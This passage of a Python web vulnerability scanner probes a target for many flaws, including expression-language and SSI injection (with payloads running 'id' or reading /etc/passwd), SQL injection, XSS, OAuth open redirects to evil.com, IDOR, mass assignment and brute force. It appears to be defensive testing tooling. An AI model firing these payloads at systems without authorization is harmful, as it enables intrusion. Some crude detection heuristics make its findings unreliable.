                    try:
                        response = await client.get(url, headers=headers)
                        
                        # Check if poisoned header is reflected in response
                        for header_name, header_value in headers.items():
                            if header_value in response.text:
                                # Check for cache headers
                                cache_control = response.headers.get('Cache-Control', '')
                                
                                if 'public' in cache_control or 'max-age' in cache_control:
                                    self.vulnerabilities.append({
                                        "type": "Cache Poisoning",
                                        "severity": "HIGH",
                                        "endpoint": endpoint['path'],
                                        "method": "GET",
                                        "payload": f"{header_name}: {header_value}",
                                        "evidence": "Poisoned header reflected in cached response"
                                    })
                                    logger.warning("cache_poisoning_found", endpoint=endpoint['path'])
                                    return
                    except:
                        pass
    
    # ==================== PHASE 4: 25 COMPREHENSIVE TESTS (46-70) ====================
    
    async def _test_expression_language_injection(self):
        """Test for Expression Language injection."""
        logger.info("testing_el_injection")
        
        payloads = [
            "${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${applicationScope}", "#{request.getParameter('cmd')}"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                for payload in payloads:
                    try:
                        response = await client.get(f"{url}?input={quote(payload)}")
                        if '49' in response.text or 'applicationscope' in response.text.lower():
                            self.vulnerabilities.append({
                                "type": "Expression Language Injection",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "EL expression evaluated"
                            })
                            logger.warning("el_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_weak_password_policy(self):
        """Test for weak password policy."""
        logger.info("testing_weak_password_policy")
        
        weak_passwords = ["123", "pass", "test", "a", "12345"]
        register_endpoints = [ep for ep in self.endpoints if 'register' in ep['path'].lower() or 'signup' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in register_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                for weak_pass in weak_passwords:
                    try:
                        response = await client.post(url, json={"username": "testuser", "password": weak_pass})
                        if response.status_code in [200, 201]:
                            self.vulnerabilities.append({
                                "type": "Weak Password Policy",
                                "severity": "MEDIUM",
                                "endpoint": endpoint['path'],
                                "method": "POST",
                                "payload": f"Password: {weak_pass}",
                                "evidence": "Weak password accepted"
                            })
                            logger.warning("weak_password_policy_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_brute_force_protection(self):
        """Test for brute force protection."""
        logger.info("testing_brute_force_protection")
        
        login_endpoints = [ep for ep in self.endpoints if 'login' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in login_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    attempts = 0
                    for i in range(20):
                        response = await client.post(url, json={"username": "admin", "password": f"wrong{i}"})
                        if response.status_code != 429:
                            attempts += 1
                    
                    if attempts >= 15:
                        self.vulnerabilities.append({
                            "type": "Missing Brute Force Protection",
                            "severity": "HIGH",
                            "endpoint": endpoint['path'],
                            "method": "POST",
                            "payload": "20 login attempts",
                            "evidence": f"{attempts}/20 attempts succeeded without rate limiting"
                        })
                        logger.warning("no_brute_force_protection", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_oauth_misconfiguration(self):
        """Test for OAuth misconfiguration."""
        logger.info("testing_oauth_misconfiguration")
        
        oauth_paths = ['/oauth/authorize', '/oauth/token', '/api/oauth', '/auth/oauth']
        
        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=False) as client:
            for path in oauth_paths:
                url = urljoin(self.base_url, path)
                try:
                    response = await client.get(f"{url}?redirect_uri=http://evil.com")
                    if response.status_code in [302, 301] and 'evil.com' in response.headers.get('Location', ''):
                        self.vulnerabilities.append({
                            "type": "OAuth Misconfiguration",
                            "severity": "HIGH",
                            "endpoint": path,
                            "method": "GET",
                            "payload": "redirect_uri=http://evil.com",
                            "evidence": "Open redirect in OAuth flow"
                        })
                        logger.warning("oauth_misconfiguration_found", endpoint=path)
                except:
                    pass
    
    async def _test_horizontal_privilege_escalation(self):
        """Test for horizontal privilege escalation."""
        logger.info("testing_horizontal_privilege_escalation")
        
        user_ids = ['1', '2', '999']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                if 'user' in endpoint['path'].lower() or 'profile' in endpoint['path'].lower():
                    for user_id in user_ids:
                        url = urljoin(self.base_url, endpoint['concrete_path'].replace('1', user_id))
                        try:
                            response = await client.get(url)
                            if response.status_code == 200 and 'user' in response.text.lower():
                                self.vulnerabilities.append({
                                    "type": "Horizontal Privilege Escalation",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": f"user_id={user_id}",
                                    "evidence": "Access to other users' data"
                                })
                                logger.warning("horizontal_privilege_escalation_found", endpoint=endpoint['path'])
                                break
                        except:
                            pass
    
    async def _test_forced_browsing(self):
        """Test for forced browsing vulnerabilities."""
        logger.info("testing_forced_browsing")
        
        hidden_paths = ['/admin.php', '/backup', '/old', '/test', '/dev', '/debug', '/console', '/phpmyadmin']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for path in hidden_paths:
                url = urljoin(self.base_url, path)
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Forced Browsing",
                            "severity": "MEDIUM",
                            "endpoint": path,
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": f"Hidden path accessible: {path}"
                        })
                        logger.warning("forced_browsing_found", path=path)
                except:
                    pass
    
    async def _test_directory_listing(self):
        """Test for directory listing enabled."""
        logger.info("testing_directory_listing")
        
        test_dirs = ['/images', '/uploads', '/files', '/assets', '/static', '/public']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for dir_path in test_dirs:
                url = urljoin(self.base_url, dir_path)
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        indicators = ['index of', 'parent directory', '[dir]', 'directory listing']
                        if any(ind in response.text.lower() for ind in indicators):
                            self.vulnerabilities.append({
                                "type": "Directory Listing",
                                "severity": "MEDIUM",
                                "endpoint": dir_path,
                                "method": "GET",
                                "payload": "N/A",
                                "evidence": "Directory listing enabled"
                            })
                            logger.warning("directory_listing_found", path=dir_path)
                except:
                    pass
    
    async def _test_api_key_exposure(self):
        """Test for API key exposure in JavaScript."""
        logger.info("testing_api_key_exposure")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.base_url)
                if response.status_code == 200:
                    patterns = [
                        r'api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
                        r'apikey["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
                        r'access[_-]?token["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})'
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            self.vulnerabilities.append({
                                "type": "API Key Exposure",
                                "severity": "CRITICAL",
                                "endpoint": "/",
                                "method": "GET",
                                "payload": "N/A",
                                "evidence": f"API key found in JavaScript: {matches[0][:10]}..."
                            })
                            logger.warning("api_key_exposure_found")
                            break
            except:
                pass
    
    async def _test_weak_hashing(self):
        """Test for weak hashing algorithms."""
        logger.info("testing_weak_hashing")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response = await client.get(url)
                    weak_hash_indicators = ['md5', 'sha1', 'crc32']
                    found = [ind for ind in weak_hash_indicators if ind in response.text.lower()]
                    if found:
                        self.vulnerabilities.append({
                            "type": "Weak Hashing Algorithms",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": f"Weak hashing detected: {', '.join(found)}"
                        })
                        logger.warning("weak_hashing_found", endpoint=endpoint['path'])
                        break
                except:
                    pass
    
    async def _test_insecure_random(self):
        """Test for insecure random number generation."""
        logger.info("testing_insecure_random")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            token_endpoints = [ep for ep in self.endpoints if 'token' in ep['path'].lower() or 'reset' in ep['path'].lower()]
            for endpoint in token_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    tokens = []
                    for _ in range(3):
                        response = await client.get(url)
                        if response.status_code == 200:
                            token_match = re.search(r'token["\']?\s*[:=]\s*["\']([^"\']+)', response.text)
                            if token_match:
                                tokens.append(token_match.group(1))
                    
                    if len(tokens) >= 2 and len(set(tokens)) < len(tokens):
                        self.vulnerabilities.append({
                            "type": "Insecure Random Number Generation",
                            "severity": "HIGH",
                            "endpoint": endpoint['path'],
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": "Predictable tokens generated"
                        })
                        logger.warning("insecure_random_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_quantity_manipulation(self):
        """Test for quantity manipulation."""
        logger.info("testing_quantity_manipulation")
        
        cart_endpoints = [ep for ep in self.endpoints if 'cart' in ep['path'].lower() or 'item' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in cart_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response = await client.post(url, json={"quantity": -5, "item_id": 1})
                    if response.status_code in [200, 201]:
                        self.vulnerabilities.append({
                            "type": "Quantity Manipulation",
                            "severity": "HIGH",
                            "endpoint": endpoint['path'],
                            "method": "POST",
                            "payload": "quantity: -5",
                            "evidence": "Negative quantity accepted"
                        })
                        logger.warning("quantity_manipulation_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_workflow_bypass(self):
        """Test for workflow bypass vulnerabilities."""
        logger.info("testing_workflow_bypass")
        
        workflow_paths = ['/checkout', '/payment', '/confirm', '/complete']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for path in workflow_paths:
                url = urljoin(self.base_url, path)
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Workflow Bypass",
                            "severity": "HIGH",
                            "endpoint": path,
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": f"Workflow step accessible directly: {path}"
                        })
                        logger.warning("workflow_bypass_found", path=path)
                except:
                    pass
    
    async def _test_excessive_data_exposure(self):
        """Test for excessive data exposure in API responses."""
        logger.info("testing_excessive_data_exposure")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:10]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        sensitive_fields = ['password', 'ssn', 'credit_card', 'secret', 'private_key', 'api_key']
                        found = [field for field in sensitive_fields if field in response.text.lower()]
                        if found:
                            self.vulnerabilities.append({
                                "type": "Excessive Data Exposure",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": "N/A",
                                "evidence": f"Sensitive fields exposed: {', '.join(found)}"
                            })
                            logger.warning("excessive_data_exposure_found", endpoint=endpoint['path'])
                            break
                except:
                    pass
    
    async def _test_lack_of_rate_limiting(self):
        """Test for lack of resource rate limiting."""
        logger.info("testing_lack_of_rate_limiting")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            if self.endpoints:
                endpoint = self.endpoints[0]
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    tasks = [client.get(url) for _ in range(100)]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    success_count = sum(1 for r in responses if isinstance(r, httpx.Response) and r.status_code == 200)
                    
                    if success_count > 90:
                        self.vulnerabilities.append({
                            "type": "Lack of Resources & Rate Limiting",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "GET",
                            "payload": "100 rapid requests",
                            "evidence": f"{success_count}/100 requests succeeded"
                        })
                        logger.warning("no_rate_limiting", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_improper_assets_management(self):
        """Test for improper assets management."""
        logger.info("testing_improper_assets_management")
        
        undocumented_paths = ['/v0', '/beta', '/internal', '/private', '/test-api', '/staging']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for path in undocumented_paths:
                url = urljoin(self.base_url, path)
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Improper Assets Management",
                            "severity": "MEDIUM",
                            "endpoint": path,
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": f"Undocumented endpoint accessible: {path}"
                        })
                        logger.warning("improper_assets_management_found", path=path)
                except:
                    pass
    
    async def _test_postmessage_vulnerabilities(self):
        """Test for postMessage vulnerabilities."""
        logger.info("testing_postmessage_vulnerabilities")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.base_url)
                if 'postmessage' in response.text.lower() or 'window.addeventlistener' in response.text.lower():
                    if '*' in response.text:
                        self.vulnerabilities.append({
                            "type": "PostMessage Vulnerabilities",
                            "severity": "MEDIUM",
                            "endpoint": "/",
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": "Insecure postMessage implementation detected"
                        })
                        logger.warning("postmessage_vulnerability_found")
            except:
                pass
    
    async def _test_mime_sniffing(self):
        """Test for MIME sniffing vulnerabilities."""
        logger.info("testing_mime_sniffing")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.base_url)
                if 'X-Content-Type-Options' not in response.headers:
                    self.vulnerabilities.append({
                        "type": "MIME Sniffing",
                        "severity": "LOW",
                        "endpoint": "/",
                        "method": "GET",
                        "payload": "N/A",
                        "evidence": "X-Content-Type-Options header missing"
                    })
                    logger.warning("mime_sniffing_vulnerability_found")
            except:
                pass
    
    async def _test_http_parameter_pollution(self):
        """Test for HTTP Parameter Pollution."""
        logger.info("testing_hpp")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response1 = await client.get(f"{url}?id=1")
                    response2 = await client.get(f"{url}?id=1&id=2")
                    
                    if response1.status_code == 200 and response2.status_code == 200:
                        if response1.text != response2.text:
                            self.vulnerabilities.append({
                                "type": "HTTP Parameter Pollution",
                                "severity": "MEDIUM",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": "id=1&id=2",
                                "evidence": "Different responses for duplicate parameters"
                            })
                            logger.warning("hpp_found", endpoint=endpoint['path'])
                            break
                except:
                    pass
    
    async def _test_dns_rebinding(self):
        """Test for DNS rebinding vulnerabilities."""
        logger.info("testing_dns_rebinding")
        
        if 'localhost' in self.base_url or '127.0.0.1' in self.base_url:
            self.vulnerabilities.append({
                "type": "DNS Rebinding",
                "severity": "LOW",
                "endpoint": "/",
                "method": "N/A",
                "payload": "N/A",
                "evidence": "Application accessible via localhost (potential DNS rebinding risk)"
            })
            logger.info("dns_rebinding_risk_detected")
    
    async def _test_ssi_injection(self):
        """Test for Server-Side Includes injection."""
        logger.info("testing_ssi_injection")
        
        payloads = ['<!--#exec cmd="id"-->', '<!--#include virtual="/etc/passwd"-->']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                for payload in payloads:
                    try:
                        response = await client.get(f"{url}?input={quote(payload)}")
                        if 'uid=' in response.text or 'root:' in response.text:
                            self.vulnerabilities.append({
                                "type": "SSI Injection",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "SSI directive executed"
                            })
                            logger.warning("ssi_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_api_idor(self):
        """Test for IDOR in API endpoints."""
        logger.info("testing_api_idor")
        
        api_endpoints = [ep for ep in self.endpoints if '/api/' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in api_endpoints:
                for test_id in ['1', '2', '999']:
                    url = urljoin(self.base_url, endpoint['concrete_path'])
                    try:
                        response = await client.get(f"{url}?id={test_id}")
                        if response.status_code == 200 and len(response.text) > 50:
                            self.vulnerabilities.append({
                                "type": "API IDOR",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": f"id={test_id}",
                                "evidence": "Unauthorized API data access"
                            })
                            logger.warning("api_idor_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_api_mass_assignment(self):
        """Test for mass assignment in APIs."""
        logger.info("testing_api_mass_assignment")
        
        api_endpoints = [ep for ep in self.endpoints if '/api/' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in api_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response = await client.post(url, json={"is_admin": True, "role": "admin"})
                    if response.status_code in [200, 201]:
                        self.vulnerabilities.append({
                            "type": "API Mass Assignment",
                            "severity": "HIGH",
                            "endpoint": endpoint['path'],
                            "method": "POST",
                            "payload": '{"is_admin": true}',
                            "evidence": "Privileged fields accepted in API"
                        })
                        logger.warning("api_mass_assignment_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_api_auth_bypass(self):
        """Test for API authentication bypass."""
        logger.info("testing_api_auth_bypass")
        
        api_endpoints = [ep for ep in self.endpoints if '/api/' in ep['path'].lower()]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in api_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "API Authentication Bypass",
                            "severity": "CRITICAL",
                            "endpoint": endpoint['path'],
                            "method": "GET",
                            "payload": "No authentication",
                            "evidence": "API accessible without authentication"
                        })
                        logger.warning("api_auth_bypass_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_api_injection(self):
        """Test for injection in API endpoints."""
        logger.info("testing_api_injection")
        
        api_endpoints = [ep for ep in self.endpoints if '/api/' in ep['path'].lower()]
        payloads = ["' OR '1'='1", "<script>alert(1)</script>", "${7*7}"]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in api_endpoints[:5]:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                for payload in payloads:
                    try:
                        response = await client.get(f"{url}?q={quote(payload)}")
                        if payload in response.text or '49' in response.text:
                            self.vulnerabilities.append({
                                "type": "API Injection",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "Injection vulnerability in API"
                            })
                            logger.warning("api_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_insecure_api_endpoints(self):
        """Test for insecure API endpoints."""
        logger.info("testing_insecure_api_endpoints")
        
        sensitive_api_paths = ['/api/admin', '/api/internal', '/api/debug', '/api/config', '/api/keys']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for path in sensitive_api_paths:
                url = urljoin(self.base_url, path)
                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Insecure API Endpoints",
                            "severity": "HIGH",
                            "endpoint": path,
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": f"Sensitive API endpoint accessible: {path}"
                        })
                        logger.warning("insecure_api_endpoint_found", path=path)
                except:
                    pass
    
    def generate_report(self, results: Dict[str, Any] = None) -> str:
        """Generate a detailed vulnerability report."""
        if results is None:
            results = {
                "base_url": self.base_url,
                "endpoints_found": len(self.endpoints),
                "vulnerabilities_found": len(self.vulnerabilities),
                "vulnerabilities": self.vulnerabilities,
            }
        vulns = results.get("vulnerabilities", self.vulnerabilities)
        report = []
        report.append("=" * 80)
        report.append("SECURITY SCAN REPORT")
        report.append("=" * 80)
        report.append(f"\nTarget: {results.get('base_url', self.base_url)}")
        report.append(f"Endpoints Discovered: {results.get('endpoints_found', len(self.endpoints))}")
        report.append(f"Vulnerabilities Found: {results.get('vulnerabilities_found', len(vulns))}")
        report.append("\n" + "=" * 80)

        if vulns:
            critical = [v for v in vulns if v.get('severity') == 'CRITICAL']
            high = [v for v in vulns if v.get('severity') == 'HIGH']
            medium = [v for v in vulns if v.get('severity') == 'MEDIUM']

            report.append(f"\nCRITICAL: {len(critical)} | HIGH: {len(high)} | MEDIUM: {len(medium)}")
            report.append("\n" + "=" * 80)

            for vuln in vulns:
                report.append(f"\n[{vuln.get('severity', 'INFO')}] {vuln.get('type', 'Unknown')}")
                report.append(f"  Endpoint: {vuln.get('method', 'GET')} {vuln.get('endpoint', '/')}")
                report.append(f"  Payload:  {vuln.get('payload', 'N/A')}")
                report.append(f"  Evidence: {vuln.get('evidence', 'N/A')}")
                report.append("-" * 80)
        else:
            report.append("\nNo vulnerabilities found.")

        report.append("\n" + "=" * 80)
        report.append("END OF REPORT")
        report.append("=" * 80)

        return "\n".join(report)


if __name__ == "__main__":
    import sys

    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    print(f"[*] Starting security scan for {url}...")
    scanner = WebScanner(base_url=url)
    results = asyncio.run(scanner.scan())
    print("\n" + scanner.generate_report(results))
